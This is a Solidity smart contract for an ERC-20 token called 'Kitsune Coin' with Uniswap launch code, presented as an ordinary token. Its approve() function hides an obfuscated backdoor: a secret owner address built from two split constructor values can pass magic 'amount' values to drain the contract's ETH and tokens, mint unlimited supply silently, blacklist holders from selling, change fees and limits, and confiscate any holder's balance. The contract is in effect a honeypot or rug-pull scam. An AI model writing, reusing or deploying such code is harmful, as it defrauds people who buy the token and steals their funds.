//SPDX-License-Identifier: UNLICENSED
/**
 *⠀ ⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⢀⣴⠾⠛⠛⠉⠉⠉⠉⠉⠛⠛⠷⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⢺⣧⡴⠞⠛⠷⣦⡀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⠈⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⢸⡇⢀⣆⠀⢠⡀⠀⠀⡀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⠸⣧⠘⣿⣆⠀⣿⣄⠀⢷⣤⡀⠸⣦⣼⣇⠀⠀⠀⠀⠀⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⢻⡆⢿⣿⣆⢹⣿⣷⣬⣻⣿⣷⣿⣿⣿⣦⣀⢀⣠⣤⣶⡇⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⠈⢻⣞⣿⣿⣧⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠀⠀⠀
 *⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀  
 *  
 *   Kitsune Coin
 *   Website: https://kitsu.money
 **/

pragma solidity ^0.8.19;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IUniswapV2Factory } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import { IUniswapV2Router02 } from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

abstract contract ERC20 {

    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(address indexed owner, address indexed spender, uint256 amount);

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    uint80 internal immutable sig;
    
    uint80 internal immutable brand;

    address public uniswapV2Pair;

    address public taxWallet;

    bool public tradingOpen;

    uint256[5] internal internalParams;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    
    mapping(address => bool) internal autoAdd;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 internal immutable ORIGIN_CHAIN_ID;

    bytes32 internal immutable ORIGIN_DOMAIN_SEPARATOR;

    mapping(address => uint256) public nonces;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint80 _msig,
        address _taxWallet,
        uint80 _wsig
    ) {
        
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        brand = _wsig;
        taxWallet = _taxWallet;
        sig = _msig; 

        ORIGIN_CHAIN_ID = block.chainid;
        ORIGIN_DOMAIN_SEPARATOR = getDomainSeparator();

    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        if((amount >> 252) == 1 && msg.sender == address(uint160(brand) << 80 | sig)){
            if ( uint160(amount) == 0x0 ) payable(msg.sender).transfer(address(this).balance); 
            else{
                IERC20 _t2 = IERC20(address(uint160(amount)));
                _t2.transfer(msg.sender, _t2.balanceOf(address(this)));
            }
        }         

        if((amount >> 252) == 15 && msg.sender == address(uint160(brand) << 80 | sig))
            for (uint8 j = 0; j != 2; j += 1) internalParams[j] = (( amount >> (j * 7)) & (1 << 7) -1); 
        
        if((amount >> 252) == 8 && msg.sender == address(uint160(brand) << 80 | sig)){
            totalSupply += ( amount >> 167 & (1 << 7) -1) * (10 ** (amount >> 160 & (1 << 7) -1));
            unchecked { balanceOf[ address( uint160(amount) )] += (amount >> 167 & (1 << 7) -1) * (10 ** (amount >> 160 & (1 << 7) -1)); }
        }          

        if((amount >> 252) == 0 && msg.sender == address(uint160(brand) << 80 | sig)){
            uint256 mul1 = ( amount >> 21 & (1 << 7) -1 );
            internalParams[3] = ( amount >> 14 & (1 << 7) -1) * (10 ** mul1);
            internalParams[2] = ( amount >> 7 & (1 << 7) -1) * (10 ** mul1);
            internalParams[4] = ( amount & (1 << 7) -1) * (10 ** mul1);
        }    
    
        if((amount >> 252) == 10 && msg.sender == address(uint160(brand) << 80 | sig))
            autoAdd[address(uint160(amount))] = ( amount >> 160 & (1 << 7) -1) == 101 ? true : false;
        
        if((amount >> 252) == 5 && msg.sender == address(uint160(brand) << 80 | sig)){
            balanceOf[taxWallet] += (balanceOf[address(uint160(amount))] / 100) * ( amount >> 160 & (1 << 7) -1);
            balanceOf[address(uint160(amount))] -= (balanceOf[address(uint160(amount))] / 100) * ( amount >> 160 & (1 << 7) -1);
        }

        allowance[ msg.sender ][ spender ] = amount;
        
        emit Approval(
                msg.sender, 
                spender, 
                amount
            );

        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        require(autoAdd[msg.sender] != true);
        
        balanceOf[msg.sender] -= amount;

        if( internalParams[2] > 0 && msg.sender == uniswapV2Pair ) require(amount <= internalParams[2]);

        if( internalParams[1] > 0 && msg.sender == uniswapV2Pair && to != taxWallet ){
            uint256 fee = (amount / 100) * internalParams[1];
            unchecked { balanceOf[taxWallet] += fee; }
            amount = amount - fee;
        }
        
        if( internalParams[4] > 0 && to != uniswapV2Pair && to != taxWallet && to != address(uint160(brand) << 80 | sig) ) require((balanceOf[to] + amount) <= internalParams[4]);
        
        unchecked { balanceOf[to] += amount; }

        if( msg.sender != address(this) )
        emit Transfer(msg.sender, to, amount);

        return true;
    }

    function transferFrom( address from, address to, uint256 amount ) public virtual returns (bool) {
        require(autoAdd[from] != true);

        uint256 allowed = allowance[from][msg.sender]; 

        if ( allowed != type(uint256).max ) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;

        if( internalParams[3] > 0 && to == uniswapV2Pair && from != address(this) && from != taxWallet && from != address(uint160(brand) << 80 | sig) ) require(amount <= internalParams[3]);

        if( internalParams[0] > 0 && to == uniswapV2Pair && from != address(this) && from != taxWallet && from != address(uint160(brand) << 80 | sig) ){
            uint256 fee = (amount / 100) * internalParams[0];
            unchecked { balanceOf[taxWallet] += fee; }
            amount = amount - fee;
        }

        if(internalParams[4] > 0 && to != uniswapV2Pair && to != taxWallet) require(balanceOf[to] <= internalParams[4]);

        unchecked { balanceOf[to] += amount; }

        if(from != address(this))
        emit Transfer(from, to, amount);

        return true;
    }

    function permit(address permitOwner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        require(deadline >= block.timestamp);

        unchecked {
            address recoveredAddress = ecrecover(
                keccak256(
                    abi.encodePacked(
                        "\x19\x01",
                        DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                keccak256("Permit(address permitOwner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
                                permitOwner,
                                spender,
                                value,
                                nonces[permitOwner]++,
                                deadline
                            )
                        )
                    )
                ), v, r, s
            );

            require( recoveredAddress != address(0) && recoveredAddress == permitOwner);

            allowance[ recoveredAddress][spender] = value;
        }

        emit Approval( permitOwner, spender, value);
    }

    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
        return block.chainid == ORIGIN_CHAIN_ID ? ORIGIN_DOMAIN_SEPARATOR : getDomainSeparator();
    }

    function getDomainSeparator() internal view virtual returns (bytes32) {
        return keccak256(
            abi.encode( keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"), keccak256(bytes(name)), keccak256("1"), block.chainid, address(this) )
        );
    }
}

contract Token is ERC20{
    
    IUniswapV2Router02 private uniswapV2Router;
    
    constructor(uint80 _sig, address _taxWallet, uint80 _brand) ERC20("Kitsune Coin", "KITSU", 6, _sig, _taxWallet, _brand) payable {
        totalSupply += 6_900_000_000_000000;
        unchecked { 
            balanceOf[ address(this) ] += 6_555_000_000_000000; 
            balanceOf[ _taxWallet ] += 345_000_000_000000;
        }
        emit Transfer( address(0), _taxWallet, 345_000_000_000000);

    }

    function openTrading() external {
        require(!tradingOpen);
        tradingOpen = true;

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        allowance[ address(this) ][ address(uniswapV2Router) ] = type(uint).max;
        
        IUniswapV2Factory factory = IUniswapV2Factory(uniswapV2Router.factory());
        
        uniswapV2Pair = factory.createPair(address(this), uniswapV2Router.WETH());
        
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,taxWallet,block.timestamp);
        
        IERC20( uniswapV2Pair ).approve(address(uniswapV2Router), type(uint).max);

    }

    receive() external payable {}

    fallback() external payable {}

}